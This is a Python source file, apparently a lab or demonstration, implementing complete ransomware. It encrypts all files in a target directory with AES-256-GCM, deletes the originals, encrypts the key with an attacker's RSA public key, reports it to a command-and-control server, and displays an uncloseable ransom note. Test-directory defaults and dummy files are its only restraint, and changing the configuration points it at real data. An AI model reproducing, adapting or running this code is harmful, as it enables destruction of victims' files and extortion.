# ransomware.py
import os
import uuid
import base64
import json
import time
import tkinter as tk
from tkinter import messagebox
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
import requests

# --- Configuration ---
# IMPORTANT: You MUST paste the content of attacker/public_key.pem here!
ATTACKER_PUBLIC_KEY = """
-----BEGIN PUBLIC KEY-----
PASTE_YOUR_PUBLIC_KEY_HERE
-----END PUBLIC KEY-----
"""

C2_SERVER_URL = "http://127.0.0.1:5000" # Change to your C2 server's IP if on another VM
TARGET_DIRECTORY = os.path.expanduser("~/test_data") # Directory to encrypt
EXTENSION = ".crypted"

# --- GUI Class for Ransom Note ---
class RansomNote(tk.Tk):
    def __init__(self, victim_id):
        super().__init__()
        self.victim_id = victim_id
        self.title("!!! YOUR FILES HAVE BEEN ENCRYPTED !!!")
        self.geometry("600x400")
        self.configure(bg='black')
        self.resizable(False, False)

        # Make window always on top
        self.attributes('-topmost', True)
        self.grab_set() # Grab focus

        label = tk.Label(self, text=(
            "Your important files have been encrypted.\n\n"
            "To get your files back, you must pay the ransom.\n" # Fake ransom demand
            "Once paid, your decryption key will be released.\n\n"
            "Your Victim ID is:\n"
        ), fg='red', bg='black', font=('Helvetica', 16))
        label.pack(pady=20)

        self.id_label = tk.Label(self, text=victim_id, fg='white', bg='black', font=('Helvetica', 14, 'bold'))
        self.id_label.pack()

        instructions = tk.Label(self, text=(
            "\nInstructions:\n"
            "1. Send your Victim ID to the attacker.\n"
            "2. Wait for confirmation of payment.\n"
            "3. Check the dead drop for your key.\n"
            "4. Click 'Decrypt Files' and enter the key."
        ), fg='white', bg='black', font=('Helvetica', 10), justify=tk.LEFT)
        instructions.pack(pady=10)

        decrypt_button = tk.Button(self, text="Decrypt Files", command=self.prompt_decrypt, bg='red', fg='white', font=('Helvetica', 12, 'bold'))
        decrypt_button.pack(pady=20)

        self.protocol("WM_DELETE_WINDOW", self.on_close) # Handle close button

    def on_close(self):
        messagebox.showwarning("Warning", "You cannot close this window. Follow the instructions.")

    def prompt_decrypt(self):
        self.withdraw() # Hide ransom note
        decrypt_window = tk.Toplevel()
        decrypt_window.title("File Decryptor")
        decrypt_window.geometry("400x200")
        decrypt_window.configure(bg='black')

        tk.Label(decrypt_window, text="Enter your decryption key:", fg='white', bg='black').pack(pady=10)
        key_entry = tk.Entry(decrypt_window, show="*", width=50)
        key_entry.pack(pady=10)

        def start_decrypt():
            key_b64 = key_entry.get()
            decrypt_window.destroy()
            self.destroy() # Close main window
            decrypt_files(key_b64)

        tk.Button(decrypt_window, text="Start Decryption", command=start_decrypt, bg='green', fg='white').pack(pady=20)


# --- Core Ransomware Functions ---

def generate_aes_key():
    """Generates a 256-bit AES key."""
    return os.urandom(32)

def load_attacker_public_key():
    """Loads the hardcoded attacker public key."""
    try:
        return serialization.load_pem_public_key(
            ATTACKER_PUBLIC_KEY.encode(),
            backend=default_backend()
        )
    except ValueError:
        print("[-] Error: Invalid Public Key. Please parse the correct public key into the script.")
        exit(1)

def encrypt_file(filepath, aes_key):
    """Encrypts a single file using AES-256-GCM."""
    nonce = os.urandom(12) # GCM recommended nonce size
    cipher = Cipher(algorithms.AES(aes_key), modes.GCM(nonce), backend=default_backend())
    encryptor = cipher.encryptor()

    with open(filepath, 'rb') as f:
        plaintext = f.read()

    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
    auth_tag = encryptor.tag

    encrypted_filepath = filepath + EXTENSION
    with open(encrypted_filepath, 'wb') as f:
        f.write(nonce + auth_tag + ciphertext)

    os.remove(filepath) # Delete original file
    print(f"[+] Encrypted {filepath}")

def decrypt_files(key_b64):
    """Decrypts files using the provided base64-encoded AES key."""
    try:
        aes_key = base64.b64decode(key_b64)
    except (base64.binascii.Error, TypeError):
        print("[-] Invalid key format. Decryption failed.")
        return

    print("[*] Starting decryption process...")
    for root, _, files in os.walk(TARGET_DIRECTORY):
        for filename in files:
            if filename.endswith(EXTENSION):
                filepath = os.path.join(root, filename)
                try:
                    with open(filepath, 'rb') as f:
                        nonce = f.read(12)
                        auth_tag = f.read(16)
                        ciphertext = f.read()

                    cipher = Cipher(algorithms.AES(aes_key), modes.GCM(nonce, auth_tag), backend=default_backend())
                    decryptor = cipher.decryptor()
                    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

                    original_filepath = filepath.removesuffix(EXTENSION)
                    with open(original_filepath, 'wb') as f:
                        f.write(plaintext)

                    os.remove(filepath)
                    print(f"[+] Decrypted {original_filepath}")

                except Exception as e:
                    print(f"[-] Failed to decrypt {filepath}: {e}")
    print("[*] Decryption complete.")

def main():
    """Main execution function."""
    if not os.path.exists(TARGET_DIRECTORY):
        print(f"[-] Target directory '{TARGET_DIRECTORY}' not found. Creating it for demo.")
        os.makedirs(TARGET_DIRECTORY)
        # Create some dummy files for testing
        with open(os.path.join(TARGET_DIRECTORY, "important_doc.txt"), "w") as f: f.write("This is a very important document.")
        with open(os.path.join(TARGET_DIRECTORY, "photo.jpg"), "wb") as f: f.write(b'fake_image_data')
        print("[*] Created dummy files. Rerun the script to encrypt.")
        return

    # 1. Generate unique AES key for this victim
    aes_key = generate_aes_key()
    attacker_pub_key = load_attacker_public_key()

    # 2. Encrypt the AES key with the attacker's RSA public key
    encrypted_aes_key = attacker_pub_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    encrypted_aes_key_b64 = base64.b64encode(encrypted_aes_key).decode('utf-8')

    # 3. Encrypt all files in the target directory
    print(f"[*] Encrypting files in {TARGET_DIRECTORY}...")
    for root, _, files in os.walk(TARGET_DIRECTORY):
        for filename in files:
            # Avoid encrypting our own encrypted files
            if not filename.endswith(EXTENSION):
                encrypt_file(os.path.join(root, filename), aes_key)
    print("[+] Encryption complete.")

    # 4. Check in with the C2 server and get the Victim ID
    victim_id = None
    try:
        print(f"[*] Checking in with C2 server at {C2_SERVER_URL}...")
        response = requests.post(f"{C2_SERVER_URL}/checkin", json={"aes_key_b64": encrypted_aes_key_b64}, timeout=10)
        response.raise_for_status()
        victim_data = response.json()
        victim_id = victim_data["victim_id"]
        print(f"[+] Successfully checked in. Victim ID: {victim_id}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Could not connect to C2 server: {e}")
        print("[!] Running in offline mode. A random Victim ID will be generated.")
        victim_id = str(uuid.uuid4()) # Generate a random ID if offline

    # 5. Display the ransom note GUI
    print("[*] Displaying ransom note...")
    app = RansomNote(victim_id)
    app.mainloop()

if __name__ == "__main__":
    main()
